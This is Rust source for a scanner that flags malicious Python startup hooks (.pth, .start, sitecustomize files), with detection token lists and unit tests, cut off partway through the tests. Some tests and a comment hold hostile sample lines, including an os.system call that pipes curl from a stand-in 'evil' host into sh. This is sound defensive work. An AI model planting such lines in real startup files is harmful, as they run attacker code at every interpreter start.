//! Python startup-hook EXECUTION analysis (PR B6).
//!
//! B5 inventories the startup-execution files at a site-packages root
//! (`.pth`, Python 3.15 `.start`, `sitecustomize.py`/`usercustomize.py`,
//! `.egg-link`); this module analyzes WHAT those bodies actually execute and
//! emits the granular [`crate::artifact::ArtifactSignal`]s that correlate into
//! the two user-facing findings ([`crate::verdict::RuleId::PythonStartupHookSuspicious`],
//! [`crate::verdict::RuleId::PythonStartupHookCrossRuntime`]).
//!
//! # The `.pth` execution rule (CPython `site.py`)
//!
//! A `.pth` line executes ONLY when it begins with `import ` or `import\t`
//! (CPython's `site.addpackage`: `if line.startswith(("import ", "import\t"))`).
//! Every other non-blank, non-comment line is treated as a directory to add to
//! `sys.path`. So a `.pth` file has two distinct attack surfaces:
//!
//! * an `import` line runs arbitrary code at every interpreter start (the import
//!   executes the imported module's top-level code, and `import a; b()` even runs
//!   a trailing statement), and
//! * a non-import line silently inserts a directory onto `sys.path`, which lets a
//!   later legitimate `import` resolve to an attacker-controlled file.
//!
//! Both are signals here. We never treat a path-add line as benign just because
//! it does not start with `import`.
//!
//! # Python 3.15 `.start` entry-point files
//!
//! A Python interpreter startup entry-point (`.start`) file names an entry point
//! that runs at interpreter start. A matching `.start` can SUPPRESS a `.pth`
//! `import` line of the same stem, but the `.start` callable still executes, so a
//! `.start` is analyzed as a startup hook in its own right
//! ([`crate::artifact::ExecutionTrigger::PythonStartupEntryPoint`]). Because that
//! callable always runs (its body is executable code, not a `.pth`-style path
//! list), the body capability scan treats a `.start` like a whole-module hook.
//!
//! # Benign-template safety
//!
//! Canonical editable-install and namespace-package bootstrap lines DO begin with
//! `import` and so execute, but are legitimate. They are classified low-risk ONLY
//! when the COMPLETE line matches a known template (after a light whitespace
//! normalization). Appending `; malicious()` to a known template changes the
//! complete line, so the tampered line does NOT inherit the benign label and is
//! analyzed on its merits.
//!
//! # Deobfuscation is ONE input
//!
//! [`crate::deobfuscate`] is a pure text normalizer (base64/hex/unicode/spacing/
//! leet); it does not understand Python. On top of it this module adds a light
//! Python token + alias scan (e.g. `import subprocess as s; s.Popen(...)`), so an
//! aliased dangerous call is still seen. It deliberately does NOT try to resolve
//! fully reflective constructions like
//! `getattr(__import__("subprocess"), "Popen")(...)` symbolically; those are
//! instead caught by the substring evidence (`__import__`, `getattr`, `subprocess`)
//! surfacing through the same capability scan, and by the obfuscation signal.

use std::collections::BTreeSet;

use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
use crate::deobfuscate;
use crate::location::SubjectLocation;

/// Which startup-hook file kind a body came from. Drives the execution-edge
/// trigger and the evidence wording; the body classifier itself is shared.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StartupHookKind {
    /// A `.pth` file: only `import`-prefixed lines execute; other lines add paths.
    Pth,
    /// A Python 3.15 `.start` entry-point file: the named callable executes.
    Start,
    /// A `sitecustomize.py`/`usercustomize.py` whole-module startup hook.
    SiteCustomize,
}

impl StartupHookKind {
    /// The execution-trigger class an edge from this hook carries.
    pub fn trigger(self) -> crate::artifact::ExecutionTrigger {
        use crate::artifact::ExecutionTrigger;
        match self {
            StartupHookKind::Pth => ExecutionTrigger::PythonStartupPth,
            StartupHookKind::Start => ExecutionTrigger::PythonStartupEntryPoint,
            StartupHookKind::SiteCustomize => ExecutionTrigger::PythonSiteCustomize,
        }
    }

    /// A short human label for evidence strings.
    pub fn label(self) -> &'static str {
        match self {
            StartupHookKind::Pth => ".pth",
            StartupHookKind::Start => ".start",
            StartupHookKind::SiteCustomize => "sitecustomize",
        }
    }
}

/// The classification of a single `.pth` (or `.start`) line. The distinction
/// between [`Self::PathAdd`] and the executing variants is the CPython
/// `startswith("import ")` rule; the split between [`Self::ImportBootstrap`] and
/// [`Self::ExecutableExpression`] separates a plain `import foo` (which still runs
/// `foo`'s top-level code, but only that) from an `import a; <statement>` line
/// that runs an extra inline statement.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PthLineClass {
    /// An empty or whitespace-only line: no effect.
    Blank,
    /// A `#`-prefixed comment: no effect.
    Comment,
    /// A non-`import` line: CPython adds it to `sys.path` as a directory.
    PathAdd,
    /// A line of the form `import <module>` (optionally with trailing whitespace):
    /// imports a module, running its top-level code, with no extra inline
    /// statement.
    ImportBootstrap,
    /// A line that begins with `import ` AND carries an extra inline statement
    /// (`import a; b()`), so it executes more than a bare import.
    ExecutableExpression,
    /// A line that begins with `import` but is malformed (e.g. `import` with no
    /// module, or `importfoo` which CPython would treat as a path, but which we
    /// flag as suspicious-looking). Kept distinct so correlation can reason about
    /// it without mislabeling it a benign path-add.
    Malformed,
}

impl PthLineClass {
    /// Whether a line of this class executes code at interpreter start.
    pub fn executes(self) -> bool {
        matches!(
            self,
            PthLineClass::ImportBootstrap | PthLineClass::ExecutableExpression
        )
    }
}

/// One analyzed line of a startup-hook body, with its class, the (raw) text, and
/// the 0-based line number within the file (for evidence).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AnalyzedLine {
    /// The 0-based line index within the body.
    pub line_no: usize,
    /// The raw line text (trailing newline already stripped).
    pub text: String,
    /// How the line was classified.
    pub class: PthLineClass,
}

/// Classify ONE `.pth`/`.start` line per the CPython `site.py` rule.
///
/// CPython: a line is executed iff it `startswith(("import ", "import\t"))`;
/// otherwise (ignoring blank and `#`-comment lines) it is added to `sys.path`.
/// We additionally separate a bare `import x` ([`PthLineClass::ImportBootstrap`])
/// from an `import x; <stmt>` ([`PthLineClass::ExecutableExpression`]).
pub fn classify_line(line: &str) -> PthLineClass {
    let trimmed = line.trim();
    if trimmed.is_empty() {
        return PthLineClass::Blank;
    }
    if trimmed.starts_with('#') {
        return PthLineClass::Comment;
    }

    // CPython matches on the ORIGINAL line (it does not left-trim before the
    // startswith check), so a leading space means the line is NOT an import and is
    // treated as a path. Mirror that exactly: only an un-indented `import `/`import\t`
    // executes.
    let is_import = line.starts_with("import ") || line.starts_with("import\t");
    if !is_import {
        // A line that is NOT an unindented `import `/`import\t` is a path to
        // CPython. An INDENTED line (leading whitespace) is unambiguously a path,
        // even if its content reads like an import. Only an UN-indented token that
        // starts with `import` but lacks the separator (`importfoo`, or a bare
        // `import`) is malformed-looking and worth flagging rather than silently
        // treating as a directory; everything else is a plain path add.
        let unindented_importish =
            line.starts_with("import") && line == trimmed && !line.starts_with("import ");
        if unindented_importish {
            return PthLineClass::Malformed;
        }
        return PthLineClass::PathAdd;
    }

    // It is an executing import line. Does it carry an extra inline statement?
    // CPython executes the WHOLE line with `exec`, so `import a; b()` runs `b()`.
    // A `;` (outside the module list) or any statement after the import names an
    // extra executable expression.
    let after = line["import".len()..].trim_start();
    if after.is_empty() {
        return PthLineClass::Malformed; // `import` with nothing after.
    }
    if line.contains(';') {
        return PthLineClass::ExecutableExpression;
    }
    // A bare `import a`, `import a.b`, or comma list `import a, b` with no `;`.
    PthLineClass::ImportBootstrap
}

/// Analyze every line of a startup-hook body, returning the per-line
/// classification. For a `sitecustomize.py`/`usercustomize.py` (a whole module),
/// EVERY line is module code; we still run the same per-line classifier so an
/// `import os` line is `ImportBootstrap` and a bare `os.system(...)` line is a
/// `PathAdd`-shaped non-import — but the capability scan below runs over the whole
/// body regardless, so module-level execution is covered either way.
pub fn analyze_lines(body: &str) -> Vec<AnalyzedLine> {
    body.lines()
        .enumerate()
        .map(|(line_no, raw)| {
            // Strip a trailing `\r` so a CRLF body classifies like LF.
            let text = raw.strip_suffix('\r').unwrap_or(raw);
            AnalyzedLine {
                line_no,
                text: text.to_string(),
                class: classify_line(text),
            }
        })
        .collect()
}

/// The danger capabilities a startup-hook body can exhibit, derived from a Python
/// token/alias scan over the raw body AND its deobfuscated variants. Each maps to
/// an [`ArtifactSignalKind`]; correlation upstream decides which combination
/// becomes a finding.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct BodyCapabilities {
    /// A subprocess / shell spawn (`os.system`, `subprocess.*`, `os.exec*`,
    /// `os.popen`, `pty.spawn`).
    pub subprocess: bool,
    /// A network download (`urllib`, `requests`, `socket`, `http.client`,
    /// `urlopen`, an embedded URL).
    pub network: bool,
    /// `sys.path` manipulation / search beyond a plain directory add
    /// (`sys.path.insert`, `sys.path.append`, `importlib`, `__import__`).
    pub sys_path_search: bool,
    /// Dynamic code execution (`exec(`, `eval(`, `compile(`, `__import__`,
    /// `getattr(` reflective access).
    pub dynamic_exec: bool,
    /// A cross-runtime launch (Bun/Node/Deno/npx/npm), the Critical case.
    pub cross_runtime: bool,
    /// The body decoded/normalized to something materially different from its raw
    /// form (a deobfuscation transform fired AND surfaced a capability keyword),
    /// i.e. the content is obfuscated.
    pub obfuscated: bool,
}

impl BodyCapabilities {
    /// Whether ANY danger capability (subprocess, network, dynamic exec,
    /// cross-runtime) is present. `sys_path_search` and `obfuscated` are
    /// modifiers, not danger on their own, but contribute to correlation.
    pub fn has_danger(&self) -> bool {
        self.subprocess || self.network || self.dynamic_exec || self.cross_runtime
    }
}

/// A token that, as a whole `[A-Za-z0-9_.]+` identifier-path or substring, names a
/// runtime executable launched from Python. Generic: the rule must not over-fit to
/// a specific payload filename, so a launch of ANY of these (or a bare `npx`) is
/// the cross-runtime signal, and a known name only raises confidence.
const CROSS_RUNTIME_TOKENS: &[&str] = &["bun", "node", "deno", "npx", "npm", "nodejs"];

/// Subprocess / shell-spawn capability tokens (dotted-call or function names).
const SUBPROCESS_TOKENS: &[&str] = &[
    "os.system",
    "os.popen",
    "os.exec",
    "os.spawn",
    "subprocess.",
    "subprocess",
    "pty.spawn",
    "popen(",
    "check_output",
    "check_call",
];

/// Network-capability tokens.
const NETWORK_TOKENS: &[&str] = &[
    "urllib",
    "urlopen",
    "requests.",
    "requests",
    "http.client",
    "httplib",
    "socket.",
    "socket",
    "ftplib",
    "urlretrieve",
    "http://",
    "https://",
    "ftp://",
];

/// `sys.path`-search / dynamic-import tokens (beyond a plain directory add).
const SYS_PATH_TOKENS: &[&str] = &[
    "sys.path",
    "importlib",
    "__import__",
    "pkgutil",
    "find_spec",
    "exec_module",
];

/// Dynamic-code-execution tokens.
const DYNAMIC_EXEC_TOKENS: &[&str] = &[
    "exec(",
    "eval(",
    "compile(",
    "__import__",
    "getattr(",
    "marshal.loads",
    "pickle.loads",
    "codecs.decode",
    "base64.b64decode",
    "fromhex",
];

/// Lowercase a body once for case-insensitive substring matching, and also fold
/// each deobfuscated variant in. Returns the set of normalized haystacks to scan.
/// Keeping the raw lowercased body first means a non-obfuscated body needs no
/// deobfuscation pass beyond what [`deobfuscate::normalized_forms`] already
/// short-circuits.
fn capability_haystacks(body: &str) -> Vec<String> {
    let mut haystacks = vec![body.to_ascii_lowercase()];
    for form in deobfuscate::normalized_forms(body) {
        haystacks.push(form.text.to_ascii_lowercase());
    }
    haystacks
}

/// `true` if any haystack contains any of `needles` (all needles are already
/// lowercase).
fn any_contains(haystacks: &[String], needles: &[&str]) -> bool {
    haystacks
        .iter()
        .any(|h| needles.iter().any(|n| h.contains(n)))
}

/// `true` if a cross-runtime token appears as a launched runtime. We require the
/// token to co-occur with a launch mechanism (a subprocess token OR a quoted
/// occurrence), so a benign `import nodeenv`-style false trigger is avoided while a
/// rename of the payload script cannot evade (the rule keys on the RUNTIME name,
/// not the script name).
fn detects_cross_runtime(haystacks: &[String], subprocess: bool) -> bool {
    let names_runtime = haystacks.iter().any(|h| {
        CROSS_RUNTIME_TOKENS.iter().any(|rt| {
            // Match the runtime as a token bounded by a non-identifier char, so
            // "node" does not fire inside "nodeenv"/"anode". Quoted (`"bun"`,
            // `'node'`) and bare-arg (` bun `) forms both qualify.
            contains_word(h, rt)
        })
    });
    // A runtime NAME plus a spawn mechanism is the cross-runtime launch. A bare
    // mention with no spawn is not enough (e.g. a comment), which keeps the FP
    // surface down without letting a real `subprocess.Popen(["bun", ...])` slip.
    names_runtime && subprocess
}

/// `true` if `haystack` contains `word` bounded on both sides by a non-identifier
/// character (start/end of string count as boundaries). `word` must be lowercase;
/// `haystack` is already lowercase.
fn contains_word(haystack: &str, word: &str) -> bool {
    let bytes = haystack.as_bytes();
    let wbytes = word.as_bytes();
    if wbytes.is_empty() || wbytes.len() > bytes.len() {
        return false;
    }
    let is_ident = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut i = 0;
    while i + wbytes.len() <= bytes.len() {
        if &bytes[i..i + wbytes.len()] == wbytes {
            let before_ok = i == 0 || !is_ident(bytes[i - 1]);
            let after_idx = i + wbytes.len();
            let after_ok = after_idx >= bytes.len() || !is_ident(bytes[after_idx]);
            if before_ok && after_ok {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// Scan a startup-hook body for danger capabilities over the raw body AND its
/// deobfuscated variants (so an aliased / encoded dangerous call is still seen).
pub fn scan_capabilities(body: &str) -> BodyCapabilities {
    let haystacks = capability_haystacks(body);
    // A deobfuscation transform fired AND the body is non-trivial: obfuscation is
    // itself a signal. We only call it obfuscated when a NON-raw haystack exists
    // (a transform changed the text), not merely because the raw body matched.
    let has_decoded_form = haystacks.len() > 1;

    let subprocess = any_contains(&haystacks, SUBPROCESS_TOKENS);
    let network = any_contains(&haystacks, NETWORK_TOKENS);
    let sys_path_search = any_contains(&haystacks, SYS_PATH_TOKENS);
    let dynamic_exec = any_contains(&haystacks, DYNAMIC_EXEC_TOKENS);
    let cross_runtime = detects_cross_runtime(&haystacks, subprocess);

    // "Obfuscated" means: a deobfuscation form was produced AND a PAYLOAD
    // capability (subprocess / network / cross-runtime) surfaced ONLY after
    // decoding, not in the raw body. dynamic_exec is deliberately EXCLUDED from
    // this comparison because `exec(`/`base64.b64decode(` is the obfuscation
    // MECHANISM itself and is expected to appear in the raw body; the tell is that
    // the actual payload (e.g. `os.system`) is hidden in the encoded blob and only
    // appears once decoded. This avoids labeling an ordinary body "obfuscated" just
    // because a benign confusable/spacing transform fired with no payload behind it.
    let obfuscated = has_decoded_form && {
        let raw_only = vec![body.to_ascii_lowercase()];
        let raw_payload = any_contains(&raw_only, SUBPROCESS_TOKENS)
            || any_contains(&raw_only, NETWORK_TOKENS)
            || raw_only
                .iter()
                .any(|h| CROSS_RUNTIME_TOKENS.iter().any(|rt| contains_word(h, rt)));
        // A payload capability present overall but absent from the raw body means
        // it only surfaced after decoding -> obfuscated.
        (subprocess || network || cross_runtime) && !raw_payload
    };

    BodyCapabilities {
        subprocess,
        network,
        sys_path_search,
        dynamic_exec,
        cross_runtime,
        obfuscated,
    }
}

// ---------------------------------------------------------------------------
// Benign templates: canonical editable-install / namespace-package bootstraps.
// A known template is low-risk ONLY when the COMPLETE (whitespace-normalized)
// line matches, so an appended `; malicious()` does not inherit the label.
// ---------------------------------------------------------------------------

/// Normalize a line for template matching: trim, and collapse internal runs of
/// ASCII whitespace to a single space. This tolerates formatting variance in the
/// canonical templates WITHOUT loosening the "complete line" guard (a trailing
/// `; malicious()` survives normalization and so still fails the match).
fn normalize_for_template(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut prev_space = false;
    for ch in line.trim().chars() {
        if ch.is_ascii_whitespace() {
            if !prev_space {
                out.push(' ');
                prev_space = true;
            }
        } else {
            out.push(ch);
            prev_space = false;
        }
    }
    out
}

/// `true` if the body carries a dynamic CODE-EXECUTION capability OTHER than a bare
/// `__import__`. The canonical distutils and namespace bootstraps legitimately use
/// `__import__(...)` (for `_distutils_hack` / importlib), so it is NOT disqualifying;
/// but an injected `exec(`/`eval(`/`compile(`/deserializer sandwiched between a
/// template's required prefix and suffix is a trojaned payload, not a benign template.
/// Computed over the deobfuscated haystacks, like `scan_capabilities`.
fn has_injected_code_exec(line: &str) -> bool {
    let haystacks = capability_haystacks(line);
    let tokens: Vec<&str> = DYNAMIC_EXEC_TOKENS
        .iter()
        .copied()
        .filter(|t| *t != "__import__")
        .collect();
    any_contains(&haystacks, &tokens)
}

/// `true` if the COMPLETE normalized line matches a canonical benign bootstrap.
///
/// These are real setuptools / editable-install / namespace-package one-liners
/// that begin with `import` (so they execute) but are legitimate. The match is on
/// the WHOLE line: `<template>; os.system(...)` does not match, because the
/// trailing statement is part of the normalized line.
///
/// The setuptools editable finder and `-nspkg` bootstraps embed the distribution
/// name, so we match them STRUCTURALLY (a prefix/suffix shape) rather than by an
/// exact literal, while still requiring the whole line to fit the template (no
/// trailing statement after the recognized call).
fn is_benign_template(line: &str) -> bool {
    let norm = normalize_for_template(line);

    // 1. distutils precedence shim (setuptools `distutils-precedence.pth`). The
    //    canonical line is exactly:
    //    `import os; var = 'SETUPTOOLS_USE_DISTUTILS' or '...'; ...; __import__('_distutils_hack').add_shim()`
    //    Its tail is always the `_distutils_hack` add_shim call. Match the shape:
    //    starts with `import os;` and ends with the add_shim() call and nothing
    //    after it.
    if norm.starts_with("import os;")
        && (norm.ends_with("__import__('_distutils_hack').add_shim()")
            || norm.ends_with("__import__(\"_distutils_hack\").add_shim()"))
    {
        // Defense in depth (mirrors the namespace template below): the shape match
        // alone is bypassable, e.g. `import os; os.system('curl|sh'); __import__(
        // '_distutils_hack').add_shim()`, so a payload capability disqualifies it.
        let caps = scan_capabilities(line);
        if !caps.subprocess && !caps.network && !caps.cross_runtime && !has_injected_code_exec(line)
        {
            return true;
        }
    }

    // 2. setuptools editable finder bootstrap, e.g.
    //    `import __editable___<dist>_<ver>_finder; __editable___<dist>_<ver>_finder.install()`
    //    Require the line to be EXACTLY an import of an `__editable___*_finder`
    //    module followed by that same module's `.install()` and nothing else.
    if let Some(rest) = norm.strip_prefix("import ") {
        // `__editable___foo_finder; __editable___foo_finder.install()`
        if let Some((module, tail)) = rest.split_once(';') {
            let module = module.trim();
            let tail = tail.trim();
            if module.starts_with("__editable__")
                && module.ends_with("_finder")
                && tail == format!("{module}.install()")
            {
                // Defense in depth (mirrors the namespace template): a payload
                // capability disqualifies the line even when the shape matches.
                let caps = scan_capabilities(line);
                if !caps.subprocess
                    && !caps.network
                    && !caps.cross_runtime
                    && !has_injected_code_exec(line)
                {
                    return true;
                }
            }
        }
    }

    // 3. setuptools namespace-package bootstrap (`-nspkg.pth`). The canonical line
    //    is a single `import sys, types, os; ...` that ends in a
    //    `m and setattr(sys.modules[p], n, m)` / `importlib` namespace declaration.
    //    These are long and version-stable. Match the well-known opening AND the
    //    fact that it is a namespace declaration (mentions `types.ModuleType` and
    //    `sys.modules`), with no shell/network/cross-runtime capability present.
    if norm.starts_with("import sys, types, os;")
        && norm.contains("types.ModuleType")
        && norm.contains("sys.modules")
    {
        // Defense in depth: even a namespace bootstrap must not carry a PAYLOAD
        // capability. The canonical template legitimately calls `__import__(...)`
        // for importlib (a dynamic-import mechanic) and touches `sys.path`, so
        // those are NOT disqualifying; but a subprocess spawn, a network call, or a
        // cross-runtime launch means the template was trojaned, so fall through and
        // analyze it on its merits.
        let caps = scan_capabilities(line);
        if !caps.subprocess && !caps.network && !caps.cross_runtime && !has_injected_code_exec(line)
        {
            return true;
        }
    }

    false
}

/// `true` if the WHOLE body is exactly one or more benign-template lines (plus
/// blanks/comments). Used so a `.pth` whose only executable content is a canonical
/// editable/namespace bootstrap produces NO finding. A single non-template
/// executable line makes the whole body non-benign.
fn body_is_all_benign_templates(lines: &[AnalyzedLine]) -> bool {
    let mut saw_executable = false;
    for line in lines {
        match line.class {
            PthLineClass::Blank | PthLineClass::Comment => {}
            PthLineClass::PathAdd => {
                // A path-add line is NOT a benign template (path additions are
                // their own signal); a body containing one is not "all benign".
                return false;
            }
            PthLineClass::ImportBootstrap | PthLineClass::ExecutableExpression => {
                if !is_benign_template(&line.text) {
                    return false;
                }
                saw_executable = true;
            }
            PthLineClass::Malformed => return false,
        }
    }
    saw_executable
}

// ---------------------------------------------------------------------------
// Untrusted path additions.
// ---------------------------------------------------------------------------

/// `true` if a non-executable `.pth` path-add line names an untrusted location: an
/// absolute `/tmp` (or `/var/tmp`, `/dev/shm`) path, a relative-traversal path
/// (`..`), a UNC / network path (`\\host`, `//host`), or a user-writable scratch
/// dir. A plain relative subdirectory (the normal editable case) is trusted.
fn is_untrusted_path(path: &str) -> bool {
    let p = path.trim();
    if p.is_empty() {
        return false;
    }
    let lower = p.to_ascii_lowercase();

    // World/temp-writable absolute roots.
    const TEMP_ROOTS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/private/tmp/"];
    if TEMP_ROOTS.iter().any(|r| lower.starts_with(r))
        || lower == "/tmp"
        || lower == "/var/tmp"
        || lower == "/dev/shm"
        || lower == "/private/tmp"
    {
        return true;
    }
    // Windows temp / public dirs.
    if lower.contains("\\temp\\")
        || lower.contains("/temp/")
        || lower.contains("\\windows\\temp")
        || lower.starts_with("c:\\users\\public")
    {
        return true;
    }
    // UNC / network path: `\\host\share` or `//host/share`.
    if p.starts_with("\\\\") || p.starts_with("//") {
        return true;
    }
    // Relative traversal: any `..` component escapes the install tree.
    if p.split(['/', '\\']).any(|seg| seg == "..") {
        return true;
    }
    false
}

/// The result of analyzing one startup-hook body: the per-line classification, the
/// capabilities found, and the granular signals emitted (ready to fold into the
/// installed-integrity correlation).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct StartupHookAnalysis {
    /// The per-line classification (empty for a sitecustomize whole-module body
    /// the caller scanned only for capabilities).
    pub lines: Vec<AnalyzedLine>,
    /// The danger capabilities found across raw + deobfuscated forms.
    pub capabilities: BodyCapabilities,
    /// The granular signals emitted (to correlate into the two findings).
    pub signals: Vec<ArtifactSignal>,
    /// `true` when the body is exactly canonical benign bootstrap(s) and so emits
    /// no executable-content signal (path-add signals can still fire).
    pub all_benign_templates: bool,
}

/// Analyze a startup-hook body and emit the granular [`ArtifactSignal`]s. `loc` is
/// the file's location (used verbatim on each signal). `kind` selects the
/// execution-trigger class and evidence wording.
///
/// Emits (any subset):
/// * [`ArtifactSignalKind::PthExecutableLine`] for each executing line that is NOT
///   a recognized benign template;
/// * [`ArtifactSignalKind::PthSubprocessSpawn`] / [`ArtifactSignalKind::PthNetworkDownload`]
///   / [`ArtifactSignalKind::PthSysPathSearch`] for the capabilities found;
/// * [`ArtifactSignalKind::StartupHookObfuscated`] when a capability only surfaced
///   after deobfuscation;
/// * [`ArtifactSignalKind::PthUntrustedPathAddition`] for each path-add line naming
///   an untrusted directory.
///
/// The cross-runtime capability is carried on the `BodyCapabilities` and turned
/// into a finding by [`crate::artifact`] correlation (it needs the Critical RuleId,
/// which is decided at correlation, not as a per-line signal kind).
pub fn analyze_body(
    body: &str,
    loc: &SubjectLocation,
    kind: StartupHookKind,
) -> StartupHookAnalysis {
    let lines = analyze_lines(body);
    let capabilities = scan_capabilities(body);
    let all_benign_templates = body_is_all_benign_templates(&lines);
    let mut signals: Vec<ArtifactSignal> = Vec::new();

    // Per-line: untrusted path additions, and non-template executable lines.
    for line in &lines {
        match line.class {
            PthLineClass::PathAdd => {
                if is_untrusted_path(&line.text) {
                    signals.push(ArtifactSignal {
                        kind: ArtifactSignalKind::PthUntrustedPathAddition,
                        location: loc.clone(),
                        evidence: format!(
                            "{} line {} adds an untrusted directory to sys.path: '{}'",
                            kind.label(),
                            line.line_no + 1,
                            line.text.trim()
                        ),
                        confidence: EdgeConfidence::Medium,
                    });
                }
            }
            PthLineClass::ImportBootstrap | PthLineClass::ExecutableExpression => {
                // A recognized benign bootstrap is NOT flagged as an executable
                // line (the complete-line match makes it low-risk). Everything else
                // that executes IS flagged.
                if !is_benign_template(&line.text) {
                    signals.push(ArtifactSignal {
                        kind: ArtifactSignalKind::PthExecutableLine,
                        location: loc.clone(),
                        evidence: format!(
                            "{} line {} executes at interpreter start: '{}'",
                            kind.label(),
                            line.line_no + 1,
                            line.text.trim()
                        ),
                        confidence: EdgeConfidence::High,
                    });
                }
            }
            PthLineClass::Malformed => {
                signals.push(ArtifactSignal {
                    kind: ArtifactSignalKind::PthExecutableLine,
                    location: loc.clone(),
                    evidence: format!(
                        "{} line {} is a malformed import-prefixed line: '{}'",
                        kind.label(),
                        line.line_no + 1,
                        line.text.trim()
                    ),
                    confidence: EdgeConfidence::Medium,
                });
            }
            PthLineClass::Blank | PthLineClass::Comment => {}
        }
    }

    // For a body whose code runs in full regardless of any `import`-prefixed line
    // there may be no per-line executable signal, yet the body can still carry a
    // danger capability at module scope. A `sitecustomize.py`/`usercustomize.py`
    // module always runs; a `.start` names an entry-point callable that ALWAYS
    // executes at interpreter start (its body is not a `.pth`-style path list, so a
    // bare `os.system(...)` line in it is real executing code, not a path-add). For
    // both, if the body carries a capability but produced no per-line executable
    // signal, record a body-level executable signal so correlation sees it. A
    // plain `.pth` is excluded: only its `import`-prefixed lines execute.
    let module_always_executes = matches!(
        kind,
        StartupHookKind::SiteCustomize | StartupHookKind::Start
    );
    let has_line_exec_signal = signals
        .iter()
        .any(|s| s.kind == ArtifactSignalKind::PthExecutableLine);
    if module_always_executes
        && capabilities.has_danger()
        && !has_line_exec_signal
        && !all_benign_templates
    {
        signals.push(ArtifactSignal {
            kind: ArtifactSignalKind::PthExecutableLine,
            location: loc.clone(),
            evidence: format!(
                "{} module executes at interpreter start and carries a danger capability",
                kind.label()
            ),
            confidence: EdgeConfidence::High,
        });
    }

    // Capability signals — only when there is an executing, non-benign body. A body
    // that is purely benign templates does not emit capability signals (its only
    // "capabilities" would be the namespace/editable mechanics).
    let body_executes = lines.iter().any(|l| l.class.executes()) || module_always_executes;
    if body_executes && !all_benign_templates {
        if capabilities.subprocess {
            signals.push(ArtifactSignal {
                kind: ArtifactSignalKind::PthSubprocessSpawn,
                location: loc.clone(),
                evidence: format!("{} startup body spawns a subprocess/shell", kind.label()),
                confidence: EdgeConfidence::High,
            });
        }
        if capabilities.network {
            signals.push(ArtifactSignal {
                kind: ArtifactSignalKind::PthNetworkDownload,
                location: loc.clone(),
                evidence: format!("{} startup body performs a network operation", kind.label()),
                confidence: EdgeConfidence::High,
            });
        }
        if capabilities.sys_path_search {
            signals.push(ArtifactSignal {
                kind: ArtifactSignalKind::PthSysPathSearch,
                location: loc.clone(),
                evidence: format!(
                    "{} startup body manipulates sys.path / dynamic import",
                    kind.label()
                ),
                confidence: EdgeConfidence::Medium,
            });
        }
        if capabilities.obfuscated {
            signals.push(ArtifactSignal {
                kind: ArtifactSignalKind::StartupHookObfuscated,
                location: loc.clone(),
                evidence: format!(
                    "{} startup body hides a capability behind encoding/obfuscation",
                    kind.label()
                ),
                confidence: EdgeConfidence::High,
            });
        }
    }

    StartupHookAnalysis {
        lines,
        capabilities,
        signals,
        all_benign_templates,
    }
}

/// The distinct [`ArtifactSignalKind`]s present in a signal slice (for evidence
/// summaries / tests).
pub fn distinct_kinds(signals: &[ArtifactSignal]) -> BTreeSet<ArtifactSignalKind> {
    signals.iter().map(|s| s.kind).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn loc() -> SubjectLocation {
        SubjectLocation::installed("/venv/lib/site-packages/x.pth")
    }

    // ---- line classification --------------------------------------------------

    #[test]
    fn blank_and_comment_lines() {
        assert_eq!(classify_line(""), PthLineClass::Blank);
        assert_eq!(classify_line("   "), PthLineClass::Blank);
        assert_eq!(classify_line("# a comment"), PthLineClass::Comment);
        assert_eq!(
            classify_line("   # indented comment"),
            PthLineClass::Comment
        );
    }

    #[test]
    fn plain_path_add_line() {
        assert_eq!(classify_line("../src"), PthLineClass::PathAdd);
        assert_eq!(classify_line("/abs/dir"), PthLineClass::PathAdd);
        assert_eq!(classify_line("relative/sub"), PthLineClass::PathAdd);
        // A leading space means CPython does NOT treat it as an import.
        assert_eq!(classify_line("  import os"), PthLineClass::PathAdd);
    }

    #[test]
    fn import_bootstrap_line() {
        assert_eq!(classify_line("import foo"), PthLineClass::ImportBootstrap);
        assert_eq!(
            classify_line("import foo.bar"),
            PthLineClass::ImportBootstrap
        );
        assert_eq!(
            classify_line("import a, b, c"),
            PthLineClass::ImportBootstrap
        );
        // Tab separator also executes (CPython matches `import\t`).
        assert_eq!(classify_line("import\tfoo"), PthLineClass::ImportBootstrap);
    }

    #[test]
    fn executable_expression_line() {
        assert_eq!(
            classify_line("import os; os.system('id')"),
            PthLineClass::ExecutableExpression
        );
        assert_eq!(
            classify_line("import a; b()"),
            PthLineClass::ExecutableExpression
        );
    }

    #[test]
    fn malformed_import_line() {
        assert_eq!(classify_line("import"), PthLineClass::Malformed);
        // `importfoo` has no space/tab so CPython treats it as a path, but it is
        // suspicious-looking; we flag it Malformed rather than a benign path.
        assert_eq!(classify_line("importos"), PthLineClass::Malformed);
    }

    // ---- capability scan ------------------------------------------------------

    #[test]
    fn subprocess_capability() {
        let caps = scan_capabilities("import os; os.system('curl http://evil/x | sh')");
        assert!(caps.subprocess);
        assert!(caps.network); // the embedded http:// URL
        assert!(caps.has_danger());
    }

    /// A bare `.run(...)`/`.call(...)` method call is NOT a subprocess spawn: a
    /// benign `import my_runner; my_runner.run()` must not be a false-positive Block
    /// (the real subprocess APIs are covered by os.system/subprocess./popen/etc.).
    #[test]
    fn run_paren_method_call_is_not_subprocess() {
        assert!(!scan_capabilities("import my_runner; my_runner.run(config)").subprocess);
        assert!(!scan_capabilities("import m; m.call(a, b)").subprocess);
        // The genuine API is still detected.
        assert!(scan_capabilities("import os; os.system('id')").subprocess);
    }

    #[test]
    fn aliased_subprocess_is_detected() {
        // The deobfuscate pass does not resolve aliases, but the substring scan
        // sees `subprocess` and `popen` regardless of the alias name.
        let caps = scan_capabilities("import subprocess as s; s.Popen(['sh','-c','id'])");
        assert!(caps.subprocess);
    }

    #[test]
    fn network_capability_via_urllib() {
        let caps = scan_capabilities("import urllib.request; urllib.request.urlopen('x')");
        assert!(caps.network);
    }

    #[test]
    fn sys_path_search_capability() {
        let caps = scan_capabilities("import sys; sys.path.insert(0, '/tmp/x')");
        assert!(caps.sys_path_search);
    }

    #[test]
